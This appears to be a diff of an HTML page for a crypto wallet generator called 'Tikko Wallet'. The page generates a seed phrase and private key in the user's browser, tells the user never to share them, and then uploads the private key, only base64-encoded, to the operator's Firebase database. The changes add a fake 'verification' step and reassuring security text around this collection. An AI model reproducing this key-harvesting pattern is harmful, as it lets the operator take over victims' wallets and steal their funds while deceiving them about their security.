@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Create Tikko Wallet</title>
+  <meta charset="UTF-8">
+  <title>Tikko Wallet</title>
   <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
@@ -13,51 +13,84 @@
       color: gold;
       font-family: Arial, sans-serif;
       text-align: center;
-      padding: 20px;
+      padding: 30px;
     }
     .logo {
+      width: 100px;
       margin: 20px auto;
       animation: spin 6s linear infinite;
-      width: 100px;
     }
     @keyframes spin {
       0% { transform: rotateY(0deg); }
       100% { transform: rotateY(360deg); }
     }
     button {
+      padding: 12px 24px;
+      font-weight: bold;
       background: gold;
       color: black;
-      font-weight: bold;
-      padding: 10px 20px;
       border: none;
+      margin: 10px;
       cursor: pointer;
-      margin: 20px 0;
     }
     textarea {
-      background: #111;
-      color: gold;
-      border: 1px solid gold;
-      padding: 10px;
       width: 90%;
       max-width: 600px;
-      margin-bottom: 20px;
+      height: 100px;
+      background: #111;
+      color: gold;
       font-family: monospace;
+      border: 1px solid gold;
+      padding: 10px;
     }
+    .hidden { display: none; }
+    ul { text-align: left; max-width: 700px; margin: auto; line-height: 1.7; }
   </style>
 </head>
 <body>
-  <img src="logo.png" alt="Tikko Logo" class="logo" />
-  <h1>Create Your Tikko Wallet</h1>
-  <p>This wallet is secure and centralized temporarily during beta. Save your seed phrase!</p>
-  <button onclick="generateWallet()">Generate Wallet</button>
 
-  <div id="wallet-section" style="display:none;">
-    <h2>🧠 Seed Phrase</h2>
+  <img src="logo.png" class="logo" alt="Tikko Logo" />
+
+  <div id="step1">
+    <h2>🚧 Verification</h2>
+    <p>Please type the code: <b>tikko.2025</b> to continue</p>
+    <input id="verifyCode" type="text" />
+    <button onclick="checkCode()">Verify</button>
+  </div>
+
+  <div id="step2" class="hidden">
+    <h2>⚠️ Security Instructions</h2>
+    <ul>
+      <li>🧠 The seed phrase is the only way to access your wallet.</li>
+      <li>📝 Write it down on paper and store it securely.</li>
+      <li>🚫 Never share your seed phrase with anyone.</li>
+      <li>🔐 We cannot recover it for you if lost.</li>
+    </ul>
+    <button onclick="startGeneration()">I Understand</button>
+  </div>
+
+  <div id="step3" class="hidden">
+    <h2>🧠 Your Seed Phrase</h2>
     <textarea id="seed" readonly></textarea>
+
     <h2>🔐 Private Key</h2>
     <textarea id="privateKey" readonly></textarea>
+
     <h2>🏦 Wallet Address</h2>
     <textarea id="address" readonly></textarea>
+
+    <button onclick="finalStep()">Continue</button>
+  </div>
+
+  <div id="step4" class="hidden">
+    <h2>🎉 Welcome to Tikko Wallet!</h2>
+    <p>Your wallet was created successfully. Keep your keys safe.</p>
+    <h3 style="color:orange;">🚨 Transaction Reminders:</h3>
+    <ul>
+      <li>✅ Always double-check the recipient address before sending.</li>
+      <li>⚠️ Some tokens require a Memo/Tag. Without it, funds may be lost.</li>
+      <li>🔐 Transactions on blockchain are irreversible.</li>
+    </ul>
   </div>
 
   <script>
@@ -67,14 +100,24 @@
       projectId: "tikkopay",
       storageBucket: "tikkopay.firebasestorage.app",
       messagingSenderId: "909306927772",
-      appId: "1:909306927772:web:ce99c74bed15068dcd6b59",
-      measurementId: "G-057WRT1ZLQ"
+      appId: "1:909306927772:web:85952ee15354a270cd6b59",
+      measurementId: "G-KTBZEQL2K6"
     };
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
-    async function generateWallet() {
+    function checkCode() {
+      const code = document.getElementById('verifyCode').value.trim();
+      if (code === "tikko.2025") {
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
+      } else {
+        alert("Invalid code.");
+      }
+    }
+
+    async function startGeneration() {
       const mnemonic = bip39.generateMnemonic();
       const hdNode = ethers.utils.HDNode.fromMnemonic(mnemonic);
       const wallet = new ethers.Wallet(hdNode.privateKey);
@@ -82,7 +125,6 @@
       document.getElementById('seed').value = mnemonic;
       document.getElementById('privateKey').value = wallet.privateKey;
       document.getElementById('address').value = wallet.address;
-      document.getElementById('wallet-section').style.display = 'block';
 
       await db.collection("wallets").add({
         address: wallet.address,
@@ -90,6 +132,14 @@
         privateKey: btoa(wallet.privateKey),
         created: new Date().toISOString()
       });
+
+      document.getElementById('step2').classList.add('hidden');
+      document.getElementById('step3').classList.remove('hidden');
+    }
+
+    function finalStep() {
+      document.getElementById('step3').classList.add('hidden');
+      document.getElementById('step4').classList.remove('hidden');
     }
   </script>
 </body>
